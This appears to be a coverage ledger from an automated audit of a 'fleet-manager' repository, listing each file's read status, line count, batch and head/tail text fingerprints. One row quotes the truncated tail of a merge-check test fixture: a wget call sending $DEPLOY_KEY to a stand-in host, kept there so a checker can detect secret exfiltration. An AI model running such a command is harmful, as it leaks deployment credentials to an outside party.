# Coverage ledger - fleet-manager full-read audit, 2026-08-10.
# Built from read-agent RETURNS. Every row's fingerprint (line count + head/tail
# slices) was recomputed from the working tree and compared before the row was
# written READ; a batch-level claim of coverage was never accepted as evidence.
# status: READ | UNVERIFIED (fingerprint did not reproduce) | NO-RETURN
# mode:   full (opened whole) | structural (large generated/vendored - see README)
# The head60/tail60 columns are the values the READ AGENT RETURNED. They are kept
# so a third party can recompute them from the tree and reproduce the comparison
# rather than take this file's word for it. See verification.md for what they do
# and do not establish.
# status	path	lines	mode	batch	head60	tail60
READ	projects/curious-research/meta.md	39	full	b49	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	try-current; failsafe byte-state via the triggers snapshot |
READ	projects/fleet-manager/coordinator-prompt.md	158	full	b49	<!-- v11 · 2026-07-18 · fleet-manager projects registry — GE	e; routine name + cadence + worker-retry + verify-after-arm.
READ	projects/fleet-manager/failsafe-prompt.md	47	full	b49	<!-- v10 · 2026-07-18 · fleet-manager projects registry — GE	and recurring deliverables run in the continuous work loop).
READ	projects/fleet-manager/instructions.md	62	full	b49	<!-- v10 · 2026-07-18 · fleet-manager projects registry — GE	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
READ	projects/fleet-manager/meta.md	91	full	b50	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	  committed or pushed by the builder).
READ	projects/fleet-manager/reboot-prompt.md	34	full	b50	<!-- v2 · 2026-07-11 (evening archive) · fleet-manager proje	```
READ	projects/fleet-manager/seat-digest.md	50	full	b50	<!-- v1 · 2026-07-12 · fleet-manager projects registry — GEN	<!-- substrate-kit:walls-digest END -->
READ	projects/fleet-manager/setup-script.sh	9	full	b50	#!/usr/bin/env bash	exit 0
READ	projects/game-lab/coordinator-prompt.md	156	full	b50	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
READ	projects/game-lab/failsafe-prompt.md	47	full	b50	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
READ	projects/game-lab/instructions.md	62	full	b50	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
READ	projects/game-lab/meta.md	26	full	b50	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
READ	projects/game-lab/seat-digest.md	82	full	b50	<!-- v1 · 2026-07-12 · fleet-manager projects registry — GEN	<!-- substrate-kit:walls-digest END -->
READ	projects/games-program/meta.md	10	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
READ	projects/gba-homebrew/meta.md	13	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	/gba-homebrew stays live and is driven by the Game Lab seat.
READ	projects/idea-engine/meta.md	13	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	/idea-engine stays live and is driven by the Ideas Lab seat.
READ	projects/ideas-lab/coordinator-prompt.md	158	full	b50	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
READ	projects/ideas-lab/failsafe-prompt.md	47	full	b50	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
READ	projects/ideas-lab/instructions.md	61	full	b50	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
READ	projects/ideas-lab/meta.md	26	full	b50	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
READ	projects/mobile-lab/meta.md	10	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
READ	projects/pokemon-mod-lab/meta.md	13	full	b50	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	kemon-mod-lab stays live and is driven by the Game Lab seat.
READ	projects/product-forge/coordinator-prompt.md	88	full	b50	<!-- v2 · 2026-07-11 · fleet-manager projects registry -->	```
READ	projects/product-forge/failsafe-prompt.md	54	full	b50	<!-- v1 · 2026-07-10 · fleet-manager projects registry -->	for manual creation in the claude.ai Routines screen.
READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0001-wip-born-red-session-card-heartbeat-phone-controller.patch	161	full	b50	From 8300f0629ffe25964b480090a59268bf4185d923 Mon Sep 17 00:	2.43.0
READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0002-phone-controller-Slice-4-combo-HID-device-keyboard-g.patch	2179	full	b51	From 2c67cb498e949fad9f93d42cbb1e61c4947f2522 Mon Sep 17 00:	2.43.0
READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0003-phone-controller-Slice-4-ci-debug-APK-artifact-hid-c.patch	201	full	b51	From fa26e6d4a6aaaa0028fbeade9c85ad9a4897e843 Mon Sep 17 00:	2.43.0
READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0004-close-out-Slice-4-heartbeat-session-card-complete-ve.patch	218	full	b51	From 6d6af92320723847c92099bb33c5314015eb0aac Mon Sep 17 00:	2.43.0
READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/README.md	70	full	b51	# Handoff — phone-controller Slice 4 (usable controller app 	  card sequence is the substrate-gate's expected shape.
READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/land.sh	31	full	b51	#!/usr/bin/env bash	NEXT
READ	projects/product-forge/instructions.md	129	full	b51	<!-- v3 · 2026-07-11 · fleet-manager projects registry -->	 from `date -u` at write time — never memory or a prior doc.
READ	projects/product-forge/meta.md	88	full	b51	# product-forge — package meta (core seat 5)	(both freshly fetched this session).
READ	projects/product-forge/setup-script.sh	8	full	b51	#!/usr/bin/env bash	exit 0
READ	projects/self-improvement/coordinator-prompt.md	156	full	b51	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
READ	projects/self-improvement/failsafe-prompt.md	47	full	b51	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
READ	projects/self-improvement/instructions.md	62	full	b51	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
READ	projects/self-improvement/meta.md	26	full	b52	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
READ	projects/sim-lab/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	o420/sim-lab stays live and is driven by the Ideas Lab seat.
READ	projects/substrate-kit/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	e-kit stays live and is driven by the Self Improvement seat.
READ	projects/superbot-2.0/coordinator-prompt.md	157	full	b52	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
READ	projects/superbot-2.0/failsafe-prompt.md	47	full	b52	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
READ	projects/superbot-2.0/instructions.md	61	full	b52	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
READ	projects/superbot-2.0/meta.md	26	full	b52	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
READ	projects/superbot-games/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	t-games stays live and is driven by the SuperBot World seat.
READ	projects/superbot-idle/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	ot-idle stays live and is driven by the SuperBot World seat.
READ	projects/superbot-mineverse/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	neverse stays live and is driven by the SuperBot World seat.
READ	projects/superbot-next/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	rbot-next stays live and is driven by the SuperBot 2.0 seat.
READ	projects/superbot-retro/meta.md	10	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — RET	  in fleet-manager; last full state @ `1dea86d`.
READ	projects/superbot-world/coordinator-prompt.md	156	full	b52	<!-- v9 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
READ	projects/superbot-world/failsafe-prompt.md	47	full	b52	<!-- v7 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
READ	projects/superbot-world/instructions.md	62	full	b52	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-14.
READ	projects/superbot-world/meta.md	26	full	b52	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	e-state verified via the triggers snapshot, not this table |
READ	projects/superbot/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	/superbot stays live and is driven by the SuperBot 2.0 seat.
READ	projects/trading-strategy/meta.md	13	full	b52	<!-- v1 · 2026-07-11 · fleet-manager projects registry — MER	g-strategy stays live and is driven by the Venture Lab seat.
READ	projects/venture-lab/coordinator-prompt.md	156	full	b52	<!-- v9 · 2026-07-18 · fleet-manager projects registry — GEN	e; routine name + cadence + worker-retry + verify-after-arm.
READ	projects/venture-lab/failsafe-prompt.md	47	full	b52	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
READ	projects/venture-lab/instructions.md	61	full	b52	<!-- v9 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-12.
READ	projects/venture-lab/meta.md	99	full	b52	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	in this session; superbot router read locally at `4fac759`).
READ	projects/venture-lab/seat-digest.md	45	full	b52	<!-- v1 · 2026-07-12 · fleet-manager projects registry — GEN	<!-- substrate-kit:walls-digest END -->
READ	projects/venture-lab/setup-script.sh	8	full	b52	#!/usr/bin/env bash	exit 0
READ	projects/websites/coordinator-prompt.md	157	full	b53	<!-- v10 · 2026-07-18 · fleet-manager projects registry — GE	e; routine name + cadence + worker-retry + verify-after-arm.
READ	projects/websites/failsafe-prompt.md	47	full	b53	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	and recurring deliverables run in the continuous work loop).
READ	projects/websites/instructions.md	62	full	b53	<!-- v8 · 2026-07-18 · fleet-manager projects registry — GEN	-15 · fm ORDER 048 · UNIVERSAL v5 · seat facts @ 2026-07-15.
READ	projects/websites/meta.md	106	full	b53	<!-- v3.7 · 2026-07-18 · fleet-manager projects registry -->	ecords — the live registry was NOT re-queried this session).
READ	projects/websites/setup-script.sh	8	full	b53	#!/usr/bin/env bash	exit 0
READ	registry/README.md	21	full	b53	# registry/ — machine-readable fleet registries	directly and need no repoint.
READ	registry/kit-versions.md	31	full	b53	# Fleet kit-version table — GENERATED	-hash class stays a follow-up (plan C10 `registry/pins.md`).
READ	registry/lanes.json	251	full	b53	{	}
READ	scripts/assemble_triggers_snapshot.py	356	full	b53	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_capabilities_grammar.py	577	full	b53	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_capabilities_wall_age.py	474	full	b53	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_docs_links.py	399	full	b53	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_fleet_triage_staleness.py	457	full	b53	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_label_hygiene.py	343	full	b53	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_lane_liveness.py	917	full	b54	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_owner_queue.py	588	full	b54	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_roster_freshness.py	381	full	b54	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/check_trigger_health.py	793	full	b54	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/emit_routine_claims.py	347	full	b54	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/env-setup.sh	55	full	b54	#!/usr/bin/env bash	exit 0
READ	scripts/fixtures/owner-queue-known-bad.md	56	full	b54	# Owner queue — KNOWN-BAD fixture (check_owner_queue.py must	  must NOT double-flag from down here.
READ	scripts/fixtures/owner-queue-known-good.md	35	full	b54	# Owner queue — KNOWN-GOOD fixture (check_owner_queue.py mus	  Blocking: blocks payment-path E2E verification.
READ	scripts/fixtures/r30/clean.yml	13	full	b54	# r30_merge_check selfcheck fixture — PASS: no secret+egress	        run: python3 scripts/check_docs_links.py --strict
READ	scripts/fixtures/r30/exfil.yml	15	full	b54	# r30_merge_check selfcheck fixture — STOP: the classic exfi	et -q -O- "https://metrics.example.dev/ingest?k=$DEPLOY_KEY"
READ	scripts/fixtures/r30/github-scoped.yml	18	full	b54	# r30_merge_check selfcheck fixture — REVIEW: secrets + egre	api.github.com/repos/${{ github.repository }}/pulls/1/merge"
READ	scripts/gen_idea_backlog.py	294	full	b54	#!/usr/bin/env python3	    raise SystemExit(main(sys.argv[1:]))
READ	scripts/gen_kit_versions.py	238	full	b54	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/gen_roster.py	2154	full	b55	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/preflight.py	113	full	b55	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/r30_merge_check.py	537	full	b55	#!/usr/bin/env python3	    sys.exit(main())
READ	scripts/verify_routine_state.py	749	full	b55	#!/usr/bin/env python3	    sys.exit(main())
READ	substrate.config.json	103	full	b55	{	}
READ	telemetry/README.md	80	full	b55	# `telemetry/` — committed machine-readable fleet telemetry	cap yet — revisit if it grows past a few hundred lines.
READ	telemetry/lane-liveness-ledger.jsonl	7	full	b55	{"evaluated_at": "2026-07-20T04:07Z", "lanes": {"fleet-manag	 "waking"}}, "snapshot_captured_at": "2026-07-21T16:00:18Z"}
READ	telemetry/model-usage.jsonl	1	full	b55	{"date": "2026-07-09", "effort": "standard", "model": "unrec	d-home-repo", "task_class": "repo-seed", "tokens_out": null}
READ	telemetry/triggers-snapshot.json	1	structural	b56	{"capture_notes": ["Capture 2026-07-21T16:00:18Z is a FULL l	mail": false, "slack": false}}, "created_via": "http_api"}]}
READ	templates/worker-preamble.md	40	full	b57	# Worker preamble templates	```
READ	tools/ab_kit_scan.py	234	full	b57	#!/usr/bin/env python3	    raise SystemExit(main())
READ	tools/check_doc_routes.py	150	full	b57	#!/usr/bin/env python3	    sys.exit(main())
READ	tools/check_no_false_walls.py	631	full	b57	#!/usr/bin/env python3	    sys.exit(main())
READ	tools/chroma_spill_probe.py	47	full	b57	from PIL import Image	emi.sum()):10d} {gx.mean():14.2f} {int((gx>15).sum()):15d}")
READ	tools/gemini_delegate.py	487	full	b57	#!/usr/bin/env python3	    raise SystemExit(main())
READ	tools/install_root_hooks.py	175	full	b57	#!/usr/bin/env python3	    sys.exit(main())
READ	tools/read_screen_recording.py	60	full	b57	#!/usr/bin/env python3	      file=sys.stderr)
READ	tools/read_shared_chat.py	160	full	b57	#!/usr/bin/env python3	    raise SystemExit(main())
READ	tools/sim/ci_tier_sim.py	790	full	b57	#!/usr/bin/env python3	    sys.exit(main())
READ	tools/test_change_guard.py	122	full	b57	#!/usr/bin/env python3	sys.exit(0 if all(T) else 1)
READ	tools/test_trigger_tools_guard.py	317	full	b57	#!/usr/bin/env python3	sys.exit(1 if failed else 0)
